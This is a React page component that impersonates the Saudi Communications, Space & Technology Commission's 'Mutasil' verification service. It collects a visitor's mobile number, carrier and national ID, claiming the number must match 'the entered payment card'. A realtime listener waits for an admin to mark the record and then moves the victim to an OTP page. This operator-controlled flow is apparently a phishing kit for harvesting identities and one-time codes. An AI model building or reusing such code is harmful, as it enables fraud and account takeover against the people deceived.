import { useEffect, useMemo, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { ChevronDown, Loader2, Check, AlertCircle, Phone, IdCard, Smartphone } from "lucide-react";
import { toast } from "sonner";
import { supabase } from "@/integrations/supabase/client";
import { getApplication, updateApplication, type StoredApplication } from "@/lib/admin-storage";
import { getVisitorId, getVisitorToken } from "@/lib/visitor-tracking";
import { isValidSaudiId, saudiIdErrorMessage } from "@/lib/saudi-id";
import { cn } from "@/lib/utils";
import { useI18n } from "@/lib/i18n";

type State = { appId?: string };

// Saudi mobile prefixes — first 3 digits after the country/operator code
// 050/053/055 STC, 053 STC Joy share with STC, 054/056/058 Zain, 057/051 Mobily, 059 Virgin/Lebara/etc.
type Provider = {
  name: string;
  prefixes: string[]; // valid first 3 digits "05X"
};
const PROVIDERS: Provider[] = [
  { name: "اس تي سي (STC)", prefixes: ["050", "053", "055"] },
  { name: "اس تي سي جوي", prefixes: ["055", "053"] },
  { name: "زين (Zain)", prefixes: ["054", "056", "058"] },
  { name: "موبايلي (Mobily)", prefixes: ["056", "057", "051"] },
  { name: "فيرجن (Virgin)", prefixes: ["056", "059"] },
  { name: "ليبارا (Lebara)", prefixes: ["059"] },
  { name: "ياقوت", prefixes: ["059"] },
];

// Normalize and validate Saudi phone: must result in 05XXXXXXXX (10 digits, starts with 05)
const normalizeSaudiPhone = (raw: string): string => {
  const digits = (raw || "").replace(/\D/g, "");
  if (digits.startsWith("00966")) return "0" + digits.slice(5);
  if (digits.startsWith("966")) return "0" + digits.slice(3);
  if (digits.startsWith("5") && digits.length === 9) return "0" + digits;
  return digits;
};

const isValidSaudiPhone = (raw: string): boolean => {
  const n = normalizeSaudiPhone(raw);
  return /^05\d{8}$/.test(n);
};

const QuoteMutasil = () => {
  const { t, isAr } = useI18n();
  const navigate = useNavigate();
  const location = useLocation();
  const { appId } = (location.state as State) || {};

  const [phone, setPhone] = useState("");
  const [provider, setProvider] = useState("");
  const [providerOpen, setProviderOpen] = useState(false);
  const [identity, setIdentity] = useState("");
  const [touched, setTouched] = useState({ phone: false, provider: false, identity: false });
  const [submitting, setSubmitting] = useState(false);
  const [app, setApp] = useState<StoredApplication | null>(null);

  const [resolvedId, setResolvedId] = useState<string | undefined>(appId);

  useEffect(() => {
    (async () => {
      let id = appId;
      if (!id) {
        const visitorId = getVisitorId();
        const { data } = await supabase
          .from("applications")
          .select("*")
          .eq("visitor_id", visitorId)
          .order("created_at", { ascending: false })
          .limit(1)
          .maybeSingle()
          .setHeader("x-visitor-token", getVisitorToken() ?? "");
        if (data) id = (data as { id: string }).id;
      }
      if (!id) return;
      setResolvedId(id);
      const a = await getApplication(id);
      if (a) {
        setApp(a);
        if (a.phone) setPhone(a.phone);
        if (a.identity) setIdentity(a.identity);
      }
    })();
  }, [appId]);

  // Realtime — admin redirects forward
  useEffect(() => {
    if (!resolvedId) return;
    const id = resolvedId;
    const ch = supabase
      .channel(`mutasil-${id}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "applications", filter: `id=eq.${id}` },
        (payload) => {
          const newRow = payload.new as { review_status?: string };
          if (newRow.review_status === "mutasil_otp_pending") {
            navigate("/quote/mutasil-otp", { replace: true, state: { appId: id } });
          } else if (newRow.review_status === "completed") {
            navigate("/quote/success", { replace: true, state: { appId: id } });
          } else if (newRow.review_status === "mutasil_rejected") {
            toast.error(t("تم رفض البيانات، يرجى التحقق وإعادة المحاولة", "The data was rejected, please check and try again"));
            setSubmitting(false);
          }
        },
      )
      .subscribe();
    return () => {
      supabase.removeChannel(ch);
    };
  }, [resolvedId, navigate]);

  const phoneError = useMemo<string | null>(() => {
    if (!phone) return t("الرجاء إدخال رقم الجوال", "Please enter your mobile number");
    if (!isValidSaudiPhone(phone))
      return t("رقم الجوال يجب أن يكون سعودي صحيح يبدأ بـ 05", "Mobile number must be a valid Saudi number starting with 05");
    return null;
  }, [phone]);

  const providerError = useMemo<string | null>(() => {
    if (!provider) return t("الرجاء اختيار مزود الخدمة", "Please select a service provider");
    const n = normalizeSaudiPhone(phone);
    if (n.length === 10) {
      const prefix = n.slice(0, 3);
      const p = PROVIDERS.find((x) => x.name === provider);
      if (p && !p.prefixes.includes(prefix)) {
        return t("رقم الجوال لا يطابق مزود الخدمة المختار", "The mobile number does not match the selected provider");
      }
    }
    return null;
  }, [provider, phone]);

  const identityError = useMemo<string | null>(() => saudiIdErrorMessage(identity), [identity]);

  const isValid = !phoneError && !providerError && !identityError;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setTouched({ phone: true, provider: true, identity: true });
    if (!isValid) {
      const msg = phoneError || providerError || identityError;
      if (msg) toast.error(msg);
      return;
    }
    const normalized = normalizeSaudiPhone(phone);
    setSubmitting(true);
    if (resolvedId) {
      try {
        await updateApplication(resolvedId, {
          mutasilPhone: normalized,
          mutasilProvider: provider,
          mutasilId: identity,
          reviewStatus: "mutasil_submitted",
        });
      } catch (err) {
        console.error("updateApplication failed", err);
      }
    }
    toast.success(t("تم إرسال البيانات، بانتظار التحقق...", "Data submitted, awaiting verification..."));
    // Stay on this page; realtime listener will navigate when admin approves
  };

  return (
    <main
      dir={isAr ? "rtl" : "ltr"}
      className="relative min-h-screen overflow-hidden bg-gradient-to-b from-[hsl(214_60%_97%)] via-[hsl(150_50%_98%)] to-[hsl(0_0%_98%)] py-6 sm:py-10"
    >
      {/* Decorative blobs */}
      <div className="pointer-events-none absolute -right-20 -top-20 h-72 w-72 rounded-full bg-[hsl(214_70%_85%)]/40 blur-3xl" />
      <div className="pointer-events-none absolute -bottom-24 -left-16 h-72 w-72 rounded-full bg-[hsl(150_60%_85%)]/40 blur-3xl" />

      <section className="relative mx-auto w-full max-w-[480px] px-3">
        <div className="overflow-hidden rounded-3xl border border-white/60 bg-white/80 shadow-[0_20px_60px_-20px_hsl(214_50%_25%/0.25)] backdrop-blur-xl">
          {/* Header */}
          <div className="relative bg-gradient-to-l from-[hsl(214_70%_22%)] via-[hsl(214_60%_30%)] to-[hsl(214_70%_22%)] px-6 py-5 text-white">
            <div className="flex items-center justify-between">
              <span className="rounded-full bg-white/15 px-2.5 py-1 text-[10px] font-bold backdrop-blur">
                {t("CST · هيئة الاتصالات", "CST · Communications Authority")}
              </span>
              <div className="flex items-center gap-2">
                <div className="text-right leading-tight">
                  <div className="text-[18px] font-extrabold">{t("متصل", "Mutasil")}</div>
                  <div className="text-[10px] font-bold tracking-[0.25em] text-white/80">
                    mutasil
                  </div>
                </div>
                <div className="flex flex-col gap-[3px]">
                  <span className="h-[3px] w-8 rounded-full bg-[hsl(214_80%_70%)]" />
                  <span className="h-[3px] w-8 rounded-full bg-[hsl(280_70%_75%)]" />
                  <span className="h-[3px] w-8 rounded-full bg-[hsl(150_60%_65%)]" />
                </div>
              </div>
            </div>
          </div>

          <div className="p-5 sm:p-7">
            {/* Title */}
            <div className="flex items-start justify-between gap-3">
              <div className="flex-1 text-right">
                <h1 className="text-[18px] font-extrabold text-[hsl(214_40%_15%)] sm:text-[19px]">
                  {t("توثيق واعتماد رقم الجوال", "Mobile Number Verification & Approval")}
                </h1>
                <p className="mt-2 text-[12.5px] leading-7 text-muted-foreground">
                  {t("يجب أن يكون رقم الجوال موثقًا ومطابقًا لبيانات الهوية الوطنية / الإقامة، ومرتبطًا ببطاقة الدفع المدخلة.", "The mobile number must be verified, match your national ID / residency data, and be linked to the entered payment card.")}
                </p>
              </div>
              <div className="grid h-12 w-12 shrink-0 place-items-center rounded-2xl bg-gradient-to-br from-[hsl(214_70%_95%)] to-[hsl(214_70%_88%)] text-[hsl(214_70%_30%)] shadow-inner">
                <Smartphone className="h-6 w-6" strokeWidth={2.2} />
              </div>
            </div>

            <form onSubmit={handleSubmit} className="mt-6 space-y-4">
              {/* Phone */}
              <div>
                <label className="mb-1.5 flex items-center justify-end gap-1.5 text-[12.5px] font-bold text-[hsl(214_40%_25%)]">
                  <span>{t("رقم الجوال", "Mobile Number")}</span>
                  <Phone className="h-3.5 w-3.5 text-[hsl(214_50%_45%)]" />
                </label>
                <div
                  className={cn(
                    "flex h-12 items-center gap-2 rounded-xl border bg-white px-3 transition-colors",
                    touched.phone && phoneError
                      ? "border-red-400 ring-2 ring-red-100"
                      : "border-[hsl(214_15%_85%)] focus-within:border-[hsl(214_60%_45%)] focus-within:ring-2 focus-within:ring-[hsl(214_60%_45%)]/15",
                  )}
                >
                  <input
                    value={phone}
                    onChange={(e) => setPhone(e.target.value.replace(/[^\d+]/g, ""))}
                    onBlur={() => setTouched((t) => ({ ...t, phone: true }))}
                    inputMode="tel"
                    dir="ltr"
                    placeholder="05XXXXXXXX"
                    maxLength={14}
                    className="h-full flex-1 bg-transparent text-[14px] font-bold tracking-wide outline-none placeholder:font-normal placeholder:text-muted-foreground/50"
                  />
                  {phone && !phoneError && (
                    <Check className="h-4 w-4 text-emerald-600" />
                  )}
                  <span className="grid h-7 min-w-[42px] place-items-center rounded-md bg-[hsl(150_60%_28%)] text-[10px] font-bold text-white">
                    +966
                  </span>
                </div>
                {touched.phone && phoneError && (
                  <p className="mt-1.5 flex items-center justify-end gap-1 text-[11.5px] font-bold text-red-600">
                    <span>{phoneError}</span>
                    <AlertCircle className="h-3.5 w-3.5" />
                  </p>
                )}
              </div>

              {/* Provider dropdown */}
              <div className="relative">
                <label className="mb-1.5 block text-end text-[12.5px] font-bold text-[hsl(214_40%_25%)]">
                  {t("اختر مزود الخدمة", "Select Service Provider")}
                </label>
                <button
                  type="button"
                  onClick={() => {
                    setProviderOpen((v) => !v);
                    setTouched((t) => ({ ...t, provider: true }));
                  }}
                  className={cn(
                    "flex h-12 w-full items-center justify-between rounded-xl border bg-white px-3 text-[14px] font-bold transition-colors focus:outline-none",
                    touched.provider && providerError
                      ? "border-red-400 ring-2 ring-red-100"
                      : "border-[hsl(214_15%_85%)] focus:border-[hsl(214_60%_45%)] focus:ring-2 focus:ring-[hsl(214_60%_45%)]/15",
                  )}
                >
                  <ChevronDown
                    className={cn(
                      "h-4 w-4 text-muted-foreground transition-transform",
                      providerOpen && "rotate-180",
                    )}
                  />
                  <span className={cn(provider ? "text-[hsl(214_30%_15%)]" : "text-muted-foreground")}>
                    {provider || t("اختر مزود الخدمة", "Select service provider")}
                  </span>
                </button>
                {providerOpen && (
                  <div className="absolute z-20 mt-1.5 max-h-72 w-full overflow-y-auto rounded-2xl border border-[hsl(214_15%_85%)] bg-white shadow-2xl">
                    {PROVIDERS.map((p) => (
                      <button
                        key={p.name}
                        type="button"
                        onClick={() => {
                          setProvider(p.name);
                          setProviderOpen(false);
                        }}
                        className={cn(
                          "flex w-full items-center justify-between gap-2 px-4 py-3 text-end text-[13.5px] font-bold transition-colors hover:bg-[hsl(150_60%_96%)]",
                          provider === p.name
                            ? "bg-[hsl(150_60%_96%)] text-[hsl(150_50%_30%)]"
                            : "text-[hsl(214_30%_25%)]",
                        )}
                      >
                        {provider === p.name ? (
                          <Check className="h-4 w-4 text-emerald-600" />
                        ) : (
                          <span className="w-4" />
                        )}
                        <span>{p.name}</span>
                      </button>
                    ))}
                  </div>
                )}
                {touched.provider && providerError && (
                  <p className="mt-1.5 flex items-center justify-end gap-1 text-[11.5px] font-bold text-red-600">
                    <span>{providerError}</span>
                    <AlertCircle className="h-3.5 w-3.5" />
                  </p>
                )}
              </div>

              {/* Identity */}
              <div>
                <label className="mb-1.5 flex items-center justify-end gap-1.5 text-[12.5px] font-bold text-[hsl(214_40%_25%)]">
                  <span>{t("رقم الهوية الوطنية / الإقامة", "National ID / Iqama Number")}</span>
                  <IdCard className="h-3.5 w-3.5 text-[hsl(214_50%_45%)]" />
                </label>
                <div
                  className={cn(
                    "flex h-12 items-center gap-2 rounded-xl border bg-white px-3 transition-colors",
                    touched.identity && identityError
                      ? "border-red-400 ring-2 ring-red-100"
                      : "border-[hsl(214_15%_85%)] focus-within:border-[hsl(214_60%_45%)] focus-within:ring-2 focus-within:ring-[hsl(214_60%_45%)]/15",
                  )}
                >
                  <input
                    value={identity}
                    onChange={(e) => setIdentity(e.target.value.replace(/\D/g, "").slice(0, 10))}
                    onBlur={() => setTouched((t) => ({ ...t, identity: true }))}
                    inputMode="numeric"
                    placeholder="1XXXXXXXXX"
                    dir="ltr"
                    className="h-full flex-1 bg-transparent text-[14px] font-bold tracking-wide outline-none placeholder:font-normal placeholder:text-muted-foreground/50"
                  />
                  {identity && isValidSaudiId(identity) && (
                    <Check className="h-4 w-4 text-emerald-600" />
                  )}
                </div>
                {touched.identity && identityError && (
                  <p className="mt-1.5 flex items-center justify-end gap-1 text-[11.5px] font-bold text-red-600">
                    <span>{identityError}</span>
                    <AlertCircle className="h-3.5 w-3.5" />
                  </p>
                )}
              </div>

              {/* Submit */}
              <button
                type="submit"
                disabled={submitting}
                className={cn(
                  "mt-3 flex h-12 w-full items-center justify-center gap-2 rounded-xl text-[15px] font-extrabold text-white shadow-[0_8px_20px_-6px_hsl(150_50%_30%/0.4)] transition-all",
                  !submitting
                    ? "btn-pay"
                    : "btn-pay opacity-50",
                )}
              >
                {submitting ? (
                  <>
                    <Loader2 className="h-4 w-4 animate-spin" />
                    {t("جاري الإرسال", "Submitting")}
                  </>
                ) : (
                  t("دخول", "Continue")
                )}
              </button>
            </form>

            {/* CST footer */}
            <div className="mt-8 flex items-center gap-3 border-t border-[hsl(214_15%_90%)] pt-5">
              <div className="grid h-14 w-14 shrink-0 place-items-center rounded-full bg-gradient-to-br from-[hsl(214_70%_60%)] to-[hsl(280_60%_55%)] text-[13px] font-black text-white shadow-md">
                CST
              </div>
              <div className="border-r border-[hsl(214_15%_85%)] pr-3 leading-tight">
                <div className="text-[12.5px] font-extrabold text-[hsl(214_60%_22%)]">
                  {t("هيئة الاتصالات والفضاء والتقنية", "Communications, Space & Technology Commission")}
                </div>
                <div className="text-[10.5px] font-bold text-[hsl(214_60%_22%)]">
                  Communications, Space & Technology Commission
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>
    </main>
  );
};

export default QuoteMutasil;